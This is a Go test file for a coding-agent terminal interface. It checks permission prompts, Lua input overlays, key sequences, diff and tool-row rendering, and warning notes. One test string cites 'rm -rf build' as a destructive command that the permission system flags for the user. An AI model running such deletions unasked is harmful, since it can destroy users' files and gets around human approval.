	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 20 * time.Second, Reasoning: "hm"})
	if a, b := row(3200), row(3600); !strings.HasPrefix(a, "@..") || !strings.HasPrefix(b, "@?.") {
		t.Fatalf("the thinking eyes do not change: %q then %q", a, b)
	}
}

// TestLuaInput drives zemi.ui.input: typing edits the prefilled line, enter
// hands the text to on_confirm, esc hands it nil.
func TestLuaInput(t *testing.T) {
	app, _ := bootAgentApp(t, 80, 20)
	open := `zemi.ui.input({ prompt = "Branch", default = "fix-" }, function(t) zemi.notify({ title = "input", body = t or "none" }) end)`

	runLua(t, app, open)
	if len(app.overlays) != 1 || app.overlays[0].o.Title != "Branch" {
		t.Fatalf("input overlay: %+v", app.overlays)
	}
	for _, r := range "lsp" {
		app.Update(tea.KeyPressMsg{Code: r, Text: string(r)})
	}
	app.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if got := lastToast(app); got != "fix-lsp" {
		t.Fatalf("enter gave %q", got)
	}
	runLua(t, app, open)
	app.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	if got := lastToast(app); got != "none" || len(app.overlays) != 0 {
		t.Fatalf("esc gave %q, overlays %d", got, len(app.overlays))
	}
}

// TestKeySequence: ctrl+g then t runs a <leader>t binding without typing
// the t; a key that breaks the sequence reaches the composer.
func TestKeySequence(t *testing.T) {
	app, _ := bootAgentApp(t, 80, 20)
	runLua(t, app, `zemi.keymap.set("<leader>t", function() zemi.notify({ title = "seq", body = "ran" }) end)`)
	ctrlG := tea.KeyPressMsg{Code: 'g', Mod: tea.ModCtrl}
	app.Update(ctrlG)
	if len(app.keySeq) != 1 {
		t.Fatalf("pending = %v", app.keySeq)
	}
	app.Update(tea.KeyPressMsg{Code: 't', Text: "t"})
	if lastToast(app) != "ran" || app.composer.text != "" {
		t.Fatalf("toasts=%v composer=%q", app.toasts, app.composer.text)
	}
	app.Update(ctrlG)
	app.Update(tea.KeyPressMsg{Code: 'x', Text: "x"})
	if len(app.keySeq) != 0 || app.composer.text != "x" {
		t.Fatalf("broken sequence: pending=%v composer=%q", app.keySeq, app.composer.text)
	}
}

// TestPermissionChoices: up and down move between the choices, enter
// answers the highlighted one, and the letters answer directly; without an
// always choice there are three.
func TestPermissionChoices(t *testing.T) {
	app, _ := bootAgentApp(t, 100, 30)
	ask := func(req hostapi.PermRequest, keys ...tea.KeyPressMsg) (bool, string) {
		t.Helper()
		done := make(chan struct{})
		var ok bool
		var by string
		go func() { ok, by = app.AskPermission(req); close(done) }()
		waitPrompt(t, app, func() bool { return app.permAsk != nil })
		for _, k := range keys {
			app.Update(k)
		}
		<-done
		return ok, by
	}
	down, up, enter := tea.KeyPressMsg{Code: tea.KeyDown}, tea.KeyPressMsg{Code: tea.KeyUp}, tea.KeyPressMsg{Code: tea.KeyEnter}
	bash := hostapi.PermRequest{Tool: "bash", Subject: "tool.bash", Arg: "go test ./...", Always: "allow `go test`"}
	for _, c := range []struct {
		name   string
		always string
		keys   []tea.KeyPressMsg
		ok     bool
		by     string
	}{
		{"down enter takes always", "allow `go test`", []tea.KeyPressMsg{down, enter}, true, "user:always"},
		{"down down enter denies", "allow `go test`", []tea.KeyPressMsg{down, down, enter}, false, "user"},
		{"up stays on yes", "allow `go test`", []tea.KeyPressMsg{up, enter}, true, "user:once"},
		{"a takes always", "allow `go test`", []tea.KeyPressMsg{{Code: 'a', Text: "a"}}, true, "user:always"},
		{"without always, down enter denies", "", []tea.KeyPressMsg{down, enter}, false, "user"},
		{"without always, a does nothing", "", []tea.KeyPressMsg{{Code: 'a', Text: "a"}, {Code: 'o', Text: "o"}}, true, "user:once"},
	} {
		bash.Always = c.always
		if ok, by := ask(bash, c.keys...); ok != c.ok || by != c.by {
			t.Errorf("%s: %v %q", c.name, ok, by)
		}
	}
}

// TestPermissionProjectKey: the "for this project" choice ("p") answers
// directly into user:project.
func TestPermissionProjectKey(t *testing.T) {
	app, _ := bootAgentApp(t, 100, 30)
	done := make(chan struct{})
	var ok bool
	var by string
	go func() {
		ok, by = app.AskPermission(hostapi.PermRequest{Subject: "tool.bash", Arg: "git push", Project: "allow `git push`"})
		close(done)
	}()
	waitPrompt(t, app, func() bool { return app.permAsk != nil })
	app.Update(tea.KeyPressMsg{Code: 'p', Text: "p"})
	<-done
	if !ok || by != "user:project" {
		t.Fatalf("ok=%v by=%q, want user:project", ok, by)
	}
}

// TestPermissionWidthKey: the repo-wide read choice ("r") answers directly,
// like the other one-letter choice keys.
func TestPermissionWidthKey(t *testing.T) {
	app, _ := bootAgentApp(t, 100, 30)
	done := make(chan struct{})
	var ok bool
	var by string
	go func() {
		ok, by = app.AskPermission(hostapi.PermRequest{Subject: "fs.read", Arg: "/repo/pkg/file.go", Always: "allow reads in /repo/pkg/", Wider: "allow reads anywhere in /repo/"})
		close(done)
	}()
	waitPrompt(t, app, func() bool { return app.permAsk != nil })
	app.Update(tea.KeyPressMsg{Code: 'r', Text: "r"})
	<-done
	if !ok || by != "user:wider" {
		t.Fatalf("r: ok=%v by=%q", ok, by)
	}
}

func TestDiffRows(t *testing.T) {
	d := "--- a.go\n+++ a.go\n@@ -9,3 +9,3 @@\n one\n-two\n+TWO\n three\n"
	var got []string
	for _, row := range diffRows(d, 40) {
		got = append(got, strings.TrimRight(plainSegs(row), " "))
	}
	want := []string{"  9  9   one", " 10    - two", "    10 + TWO", " 11 11   three"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Fatalf("rows = %q", got)
	}
	got = nil
	for _, row := range diffRows("@@ -1 +1 @@\n+alpha beta gamma delta", 20) {
		got = append(got, strings.TrimRight(plainSegs(row), " "))
	}
	if want := []string{"   1 + alpha beta", "       gamma delta"}; strings.Join(got, "|") != strings.Join(want, "|") {
		t.Fatalf("wrapped rows = %q", got)
	}
}

// TestFileRowClickIDs: a file tool's rows carry the id that opens the file,
// the head row at its top and every diff row at its own line; other tools
// carry none.
func TestFileRowClickIDs(t *testing.T) {
	app, host := bootAgentApp(t, 100, 30)
	host.AppendMessage("user", "fix it")
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Tools: []hostapi.StreamTool{
		{Name: "edit", Input: "/w/a.go", Status: "ok", Diff: "--- a.go\n+++ a.go\n@@ -7,2 +7,2 @@\n-old\n+new\n keep"},
		{Name: "bash", Input: "go test", Status: "ok"},
	}})
	app.renderSync(t)
	_ = app.Frame() // compose fills lastRows
	click := map[string]string{}
	for _, row := range app.lastRows {
		text := strings.Join(strings.Fields(plainSegs(row)), " ")
		for _, s := range row {
			if s.Click != "" {
				click[text] = s.Click
			}
		}
	}
	for text, want := range map[string]string{
		"✓ Edit /w/a.go":  "tool:-1",
		"7 - old":         "tool:-1",
		"7 + new":         "tool:-1",
		"8 keep":          "tool:-1",
		"✓ Ran 1 command": "tool:-2",
	} {
		if click[text] != want {
			t.Errorf("%q = %q, want %q (rows: %v)", text, click[text], want, click)
		}
	}
}

// TestToolRows: finished calls that only look around collapse into one
// line, edits and failures keep their rows, a command shows the model's
// description with the command under it, and ctrl+o shows every call.
func TestToolRows(t *testing.T) {
	app, host := bootAgentApp(t, 100, 30)
	host.AppendMessage("user", "fix it")
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Tools: []hostapi.StreamTool{
		{Name: "read", Input: "a.go", Status: "ok"},
		{Name: "read", Input: "b.go", Status: "ok"},
		{Name: "bash", Input: "go vet ./...", Label: "Vet the code", Status: "ok", Output: "vet clean"},
		{Name: "edit", Input: "a.go", Status: "ok", Diff: "--- a.go\n+++ a.go\n@@ -7 +7 @@\n-old\n+new"},
		{Name: "bash", Input: "go test ./...", Label: "Run the unit tests", Status: "err", Output: "--- FAIL: TestX"},
		{Name: "grep", Input: strings.Repeat("pattern ", 30), Status: "ok"},
		{Name: "bash", Input: "make slow", Label: "Build it", Status: "ok", Output: "still running, so it " + tools.JobHandoff + "job-1"},
	}})
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	for _, want := range []string{"Read 2 files, ran 1 command", "✓ Build it", "✓ Edit a.go", "7 - old", "7 + new", "✗ Run the unit tests", "⎿ go test ./...", "--- FAIL: TestX"} {
		if !strings.Contains(frame, want) {
			t.Fatalf("missing %q:\n%s", want, frame)
		}
	}
	if strings.Contains(frame, "vet clean") {
		t.Fatalf("command output shows only with ctrl+o:\n%s", frame)
	}
	host.ToggleReasoning()
	app.renderSync(t)
	frame = ansi.Strip(app.Frame())
	if !strings.Contains(frame, "✓ Read b.go") || strings.Contains(frame, "Read 2 files") || !strings.Contains(frame, "vet clean") {
		t.Fatalf("ctrl+o must list every call:\n%s", frame)
	}
	// an expanded long input wraps instead of ending in an ellipsis
	var words int
	for row := range strings.SplitSeq(frame, "\r\n") {
		words += strings.Count(row, "pattern")
	}
	if words != 30 {
		t.Fatalf("expanded input shows %d of 30 words:\n%s", words, frame)
	}
}

// TestReasoningWrapKeepsWords: an expanded thought longer than the chat
// width wraps without losing or repeating words.
func TestReasoningWrapKeepsWords(t *testing.T) {
	app, host := bootAgentApp(t, 60, 40)
	var words []string
	for i := range 40 {
		words = append(words, fmt.Sprintf("w%02d", i))
	}
	host.AppendMessage("user", "why?")
	host.AppendReasoning(strings.Join(words, " ")+"\n\nsecond paragraph", hostapi.TurnStat{ThoughtMS: 1000})
	host.ToggleReasoning()
	app.renderSync(t)
	var got []string
	for row := range strings.SplitSeq(ansi.Strip(app.Frame()), "\r\n") {
		if strings.HasPrefix(row, "┌") {
			break // the composer frame below, whose rows carry the same gutter
		}
		if _, body, ok := strings.Cut(row, "│ "); ok {
			got = append(got, strings.Fields(body)...)
		}
	}
	if want := append(words, "second", "paragraph"); strings.Join(got, " ") != strings.Join(want, " ") {
		t.Fatalf("wrapped words:\n%s", strings.Join(got, " "))
	}
}

func TestStreamEventsCoalesce(t *testing.T) {
	app := &App{testQueue: make(chan tea.Msg, hookQueueSize), log: logging.New(""), focused: true}
	for range 3 * hookQueueSize {
		app.AgentStream()
	}
	if n := len(app.testQueue); n != 1 {
		t.Fatalf("queued %d stream events, want 1", n)
	}
	app.TurnDone("")
	if n := len(app.testQueue); n != 2 {
		t.Fatalf("turn_done must always queue, got %d", n)
	}
	for app.Pump() {
	}
	app.AgentStream()
	if n := len(app.testQueue); n != 1 {
		t.Fatalf("a handled event must let the next one queue, got %d", n)
	}
}

// TestWidgetErrorRecordedOnce: a widget whose render raises is recorded in
// /errors once, not once per frame.
func TestWidgetErrorRecordedOnce(t *testing.T) {
	app, host := bootAgentApp(t, 80, 20)
	run := func(src string) {
		t.Helper()
		if err := host.RT.ExecuteChunk(context.Background(), src, "w.lua", lua.OriginUser); err != nil {
			t.Fatal(err)
		}
	}
	run(`zemi.ui.widget.add({ id = "bad", region = "statusline.right", render = function() error("boom") end })`)
	for range 10 {
		for app.Pump() {
		}
		if cmd := app.renderStaleWidgetsCmd(); cmd != nil {
			app.Update(cmd())
		}
	}
	run(`local n = #zemi.errors.list(); assert(n == 1, "errors: " .. n)`)
}

// TestPermTitle: the prompt names what a request does in words, not its subject.
func TestPermTitle(t *testing.T) {
	for _, c := range []struct {
		req          hostapi.PermRequest
		verb, target string
	}{
		{hostapi.PermRequest{Subject: "tool.bash", Arg: "make", Description: "Build"}, "Run this command?", ""},
		{hostapi.PermRequest{Tool: "write", Subject: "fs.write", Arg: "/p/a.go"}, "Write this file?", "a.go"},
		{hostapi.PermRequest{Tool: "lua", Subject: "tool.lua", Arg: "script"}, "Run Lua inside zemi?", ""},
		{hostapi.PermRequest{Tool: "lua", Subject: "tool.lua", Arg: "/p/x.lua"}, "Run Lua inside zemi?", "x.lua"},
		{hostapi.PermRequest{Subject: "lua.fs.write", Arg: "x"}, "Allow lua.fs.write?", "x"},
	} {
		if verb, target := permTitle(c.req, "/p"); verb != c.verb || target != c.target {
			t.Errorf("%+v: %q %q", c.req, verb, target)
		}
	}
}

// TestPermBoxFitsShortScreen: the choices and the hint always fit, so a
// wrapped choice and a preview too tall for the screen cannot cut the box's
// bottom border or the row that says how to answer and scroll.
func TestPermBoxFitsShortScreen(t *testing.T) {
	app, host := bootAgentApp(t, 60, 16)
	host.SeedStream(hostapi.StreamSnapshot{Active: true, Elapsed: 4 * time.Second})
	app.permAsk = &permAskPrompt{req: hostapi.PermRequest{
		Tool: "bash", Subject: "tool.bash",
		Arg:    "go test ./internal/ui/... -run X\necho a\necho b\necho c",
		Always: "allow `go test` and 3 more",
	}}
	app.renderSync(t)
	frame := ansi.Strip(app.Frame())
	if !strings.Contains(frame, "enter confirm") || !strings.Contains(frame, "└") || !strings.Contains(frame, "lines 1-1 of 4") {
		t.Fatalf("the prompt is cut:\n%s", frame)
	}
}

func TestPermNote(t *testing.T) {
	for _, c := range []struct{ reason, want string }{
		{"", ""},
		{"not settled: rm -rf build may delete many files", "not settled: rm -rf build may delete many files"},
		{"agent general; not settled: rm -rf build may delete many files", "asked by the general agent: not settled: rm -rf build may delete many files"},
		{"agent general: read diagnostics; not settled: this project is not trusted", "asked by the general agent: read diagnostics; not settled: this project is not trusted"},
		{"agent web", "asked by the web agent"},
	} {
		if got, _ := permNote(c.reason); got != c.want {
			t.Errorf("permNote(%q) = %q, want %q", c.reason, got, c.want)
		}
	}
}
